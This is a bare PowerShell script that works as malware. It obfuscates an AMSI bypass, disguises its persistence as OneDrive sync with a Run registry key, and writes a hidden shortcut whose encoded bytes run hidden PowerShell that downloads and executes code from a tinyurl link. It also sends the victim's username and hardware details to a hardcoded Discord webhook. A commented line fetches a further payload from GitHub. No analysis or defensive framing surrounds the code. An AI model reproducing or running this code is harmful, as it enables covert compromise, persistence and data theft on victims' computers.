$P1 = 'S'; $P2 = 'y'; $P3 = 's'; $P4 = 't'; $P5 = 'e'; $P6 = 'm'
$Sys = $P1 + $P2 + $P3 + $P4 + $P5 + $P6

$M1 = 'M'; $M2 = 'a'; $M3 = 'n'; $M4 = 'a'; $M5 = 'g'; $M6 = 'e'; $M7 = 'm'; $M8 = 'e'; $M9 = 'n'; $M10 = 't'
$Mgmt = $M1 + $M2 + $M3 + $M4 + $M5 + $M6 + $M7 + $M8 + $M9 + $M10

$A1 = 'A'; $A2 = 'u'; $A3 = 't'; $A4 = 'o'; $A5 = 'm'; $A6 = 'a'; $A7 = 't'; $A8 = 'i'; $A9 = 'o'; $A10 = 'n'
$Auto = $A1 + $A2 + $A3 + $A4 + $A5 + $A6 + $A7 + $A8 + $A9 + $A10

$U1 = 'A'; $U2 = 'm'; $U3 = 's'; $U4 = 'i'; $U5 = 'U'; $U6 = 't'; $U7 = 'i'; $U8 = 'l'; $U9 = 's'
$Utils = $U1 + $U2 + $U3 + $U4 + $U5 + $U6 + $U7 + $U8 + $U9

$G1 = 'G'; $G2 = 'e'; $G3 = 't'; $G4 = 'F'; $G5 = 'i'; $G6 = 'e'; $G7 = 'l'; $G8 = 'd'
$GetField = $G1 + $G2 + $G3 + $G4 + $G5 + $G6 + $G7 + $G8

$F1 = 'N'; $F2 = 'o'; $F3 = 'n'; $F4 = 'P'; $F5 = 'u'; $F6 = 'b'; $F7 = 'l'; $F8 = 'i'; $F9 = 'c'
$NonPublic = $F1 + $F2 + $F3 + $F4 + $F5 + $F6 + $F7 + $F8 + $F9

$S1 = 'S'; $S2 = 't'; $S3 = 'a'; $S4 = 't'; $S5 = 'i'; $S6 = 'c'
$Static = $S1 + $S2 + $S3 + $S4 + $S5 + $S6

$zep = $M4+$M7+$U3+$U4+'I'+$M9+$S5+$A7+'F'+$S3+$S5+$F7+$M6+$G8

$NullVal = $null
$TrueVal = $true

$Pop = [Ref].Assembly.GetType("$Sys.$Mgmt.$Auto.$Utils")
$nopLeep = $Pop.$GetField($zep, "$NonPublic,$Static")
$nopLeep.SetValue($NullVal, $TrueVal)

start .\node.exe
$googoogaagaa = "C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk"
if (-Not (Test-Path $googoogaagaa)) {

$currentPath = [System.Environment]::GetEnvironmentVariable("PATH", "User")
$newPath = $currentPath + ";$env:tmp"
[System.Environment]::SetEnvironmentVariable("PATH", $newPath, "User")
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDrive File Sync" -Value '"C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk"' -PropertyType String -Force


mkdir "C:\ProgramData\Microsoft OneDrive\FileSync";
$savedbytes = (76,0,0,0,1,20,2,0,0,0,0,0,192,0,0,0,0,0,0,70,171,0,8,0,32,0,0,0,124,37,104,27,210,97,216,1,203,131,156,28,20,3,219,1,124,37,104,27,210,97,216,1,0,16,1,0,0,0,0,0,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,69,1,20,0,31,80,224,79,208,32,234,58,105,16,162,216,8,0,43,48,48,157,25,0,47,67,58,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,86,0,49,0,0,0,0,0,23,89,186,133,48,0,87,105,110,100,111,119,115,0,64,0,9,0,4,0,239,190,167,84,44,42,41,89,8,186,46,0,0,0,246,25,0,0,0,0,2,0,0,0,0,0,12,1,0,0,0,0,0,0,0,0,46,238,28,1,87,0,105,0,110,0,100,0,111,0,119,0,115,0,0,0,22,0,90,0,49,0,0,0,0,0,36,89,104,183,16,0,83,121,115,116,101,109,51,50,0,0,66,0,9,0,4,0,239,190,167,84,44,42,41,89,8,186,46,0,0,0,76,95,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,208,173,33,0,83,0,121,0,115,0,116,0,101,0,109,0,51,0,50,0,0,0,24,0,102,0,50,0,0,16,1,0,167,84,130,42,32,0,102,111,114,102,105,108,101,115,46,101,120,101,0,0,74,0,9,0,4,0,239,190,167,84,130,42,41,89,208,189,46,0,0,0,65,248,0,0,0,0,1,0,0,0,0,0,116,0,0,0,0,0,0,0,0,0,132,116,26,0,102,0,111,0,114,0,102,0,105,0,108,0,101,0,115,0,46,0,101,0,120,0,101,0,0,0,28,0,0,0,86,0,0,0,28,0,0,0,1,0,0,0,28,0,0,0,52,0,0,0,0,0,0,0,85,0,0,0,24,0,0,0,3,0,0,0,96,56,18,250,16,0,0,0,87,105,110,100,111,119,115,0,67,58,92,87,105,110,100,111,119,115,92,83,121,115,116,101,109,51,50,92,102,111,114,102,105,108,101,115,46,101,120,101,0,0,35,0,46,0,46,0,92,0,46,0,46,0,92,0,87,0,105,0,110,0,100,0,111,0,119,0,115,0,92,0,83,0,121,0,115,0,116,0,101,0,109,0,51,0,50,0,92,0,102,0,111,0,114,0,102,0,105,0,108,0,101,0,115,0,46,0,101,0,120,0,101,0,193,0,47,0,112,0,32,0,99,0,58,0,92,0,119,0,105,0,110,0,100,0,111,0,119,0,115,0,92,0,115,0,121,0,115,0,116,0,101,0,109,0,51,0,50,0,32,0,47,0,109,0,32,0,110,0,111,0,116,0,101,0,112,0,97,0,100,0,46,0,101,0,120,0,101,0,32,0,47,0,99,0,32,0,34,0,112,0,111,0,119,0,101,0,114,0,115,0,104,0,101,0,108,0,108,0,46,0,101,0,120,0,101,0,32,0,45,0,99,0,111,0,109,0,109,0,97,0,110,0,100,0,32,0,112,0,111,0,119,0,101,0,114,0,115,0,104,0,101,0,108,0,108,0,32,0,45,0,119,0,105,0,110,0,100,0,111,0,119,0,115,0,116,0,121,0,108,0,101,0,32,0,104,0,32,0,45,0,99,0,111,0,109,0,109,0,97,0,110,0,100,0,32,0,39,0,115,0,97,0,108,0,32,0,99,0,97,0,108,0,108,0,105,0,116,0,32,0,105,0,69,0,120,0,59,0,32,0,115,0,97,0,108,0,32,0,36,0,101,0,110,0,118,0,58,0,111,0,115,0,32,0,105,0,87,0,114,0,59,0,32,0,99,0,97,0,108,0,108,0,105,0,84,0,40,0,87,0,73,0,78,0,68,0,79,0,87,0,83,0,95,0,78,0,84,0,32,0,116,0,105,0,110,0,121,0,117,0,114,0,108,0,46,0,99,0,111,0,109,0,47,0,121,0,101,0,121,0,107,0,121,0,100,0,117,0,110,0,32,0,45,0,117,0,115,0,101,0,98,0,97,0,115,0,105,0,99,0,112,0,97,0,114,0,115,0,105,0,110,0,103,0,41,0,39,0,34,0,16,0,0,0,5,0,0,160,37,0,0,0,221,0,0,0,28,0,0,0,11,0,0,160,119,78,193,26,231,2,93,78,183,68,46,177,174,81,152,183,221,0,0,0,96,0,0,0,3,0,0,160,88,0,0,0,0,0,0,0,99,114,97,112,116,111,112,50,0,0,0,0,0,0,0,0,196,49,59,201,13,196,148,66,184,218,109,105,55,240,101,251,41,38,252,74,194,110,239,17,150,194,212,216,83,133,24,17,196,49,59,201,13,196,148,66,184,218,109,105,55,240,101,251,41,38,252,74,194,110,239,17,150,194,212,216,83,133,24,17,73,2,0,0,9,0,0,160,89,0,0,0,49,83,80,83,237,48,189,218,67,0,137,71,167,248,208,19,164,115,102,34,61,0,0,0,100,0,0,0,0,31,0,0,0,22,0,0,0,83,0,121,0,115,0,116,0,101,0,109,0,51,0,50,0,32,0,40,0,67,0,58,0,92,0,87,0,105,0,110,0,100,0,111,0,119,0,115,0,41,0,0,0,0,0,0,0,137,0,0,0,49,83,80,83,226,138,88,70,188,76,56,67,187,252,19,147,38,152,109,206,109,0,0,0,4,0,0,0,0,31,0,0,0,46,0,0,0,83,0,45,0,49,0,45,0,53,0,45,0,50,0,49,0,45,0,49,0,57,0,53,0,51,0,51,0,50,0,51,0,48,0,50,0,49,0,45,0,57,0,49,0,53,0,52,0,51,0,56,0,48,0,54,0,57,0,45,0,51,0,50,0,50,0,50,0,51,0,54,0,51,0,57,0,52,0,52,0,45,0,49,0,48,0,48,0,49,0,0,0,0,0,0,0,177,0,0,0,49,83,80,83,48,241,37,183,239,71,26,16,165,241,2,96,140,158,235,172,45,0,0,0,10,0,0,0,0,31,0,0,0,13,0,0,0,102,0,111,0,114,0,102,0,105,0,108,0,101,0,115,0,46,0,101,0,120,0,101,0,0,0,0,0,21,0,0,0,15,0,0,0,0,64,0,0,0,0,154,130,27,210,97,216,1,21,0,0,0,12,0,0,0,0,21,0,0,0,0,16,1,0,0,0,0,0,41,0,0,0,4,0,0,0,0,31,0,0,0,12,0,0,0,65,0,112,0,112,0,108,0,105,0,99,0,97,0,116,0,105,0,111,0,110,0,0,0,21,0,0,0,14,0,0,0,0,64,0,0,0,124,37,104,27,210,97,216,1,0,0,0,0,113,0,0,0,49,83,80,83,166,106,99,40,61,149,210,17,181,214,0,192,79,217,24,208,85,0,0,0,30,0,0,0,0,31,0,0,0,33,0,0,0,67,0,58,0,92,0,87,0,105,0,110,0,100,0,111,0,119,0,115,0,92,0,83,0,121,0,115,0,116,0,101,0,109,0,51,0,50,0,92,0,102,0,111,0,114,0,102,0,105,0,108,0,101,0,115,0,46,0,101,0,120,0,101,0,0,0,0,0,0,0,0,0,57,0,0,0,49,83,80,83,177,22,109,68,173,141,112,72,167,72,64,46,164,61,120,140,29,0,0,0,104,0,0,0,0,72,0,0,0,127,105,194,224,217,88,248,75,138,252,26,60,66,49,4,72,0,0,0,0,0,0,0,0,0,0,0,0)
$reconstructedFile = "C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk"
[System.IO.File]::WriteAllBytes($reconstructedFile, $savedbytes)
$ieoaj = $reconstructedFile
sleep 10
attrib +s +h $ieoaj

# Retrieve CPU information
$cpu = Get-WmiObject -Class Win32_Processor | Select-Object -Property Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors

# Retrieve GPU information
$gpu = Get-WmiObject -Class Win32_VideoController | Select-Object -Property Name, AdapterRAM, DriverVersion

sleep 2

# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1290163974687690752/4kGM4khXxmudfn74j3ZTg74FrFHondaWoqRoZ_VtRphYZaxIUkcFUBag4cKwcifjz_dt"

# Define the message payload
$payload = @{
    content = @"
**$env:username** has joined - PhShop
----------------------------------
**GPU:** $($gpu.Name)
**CPU:** $($cpu.Name)
**CPU Cores:** $($cpu.NumberOfCores)
"@
} | ConvertTo-Json

# Send the POST request to the webhook URL
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    Write-Output "Message sent successfully."
} catch {
    Write-Output "Failed to send message. Error: $_"
}
#start powershell -windowstyle h -args 'sleep 10; iex(iwr https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/gaber.txt -usebasicparsing)'

}
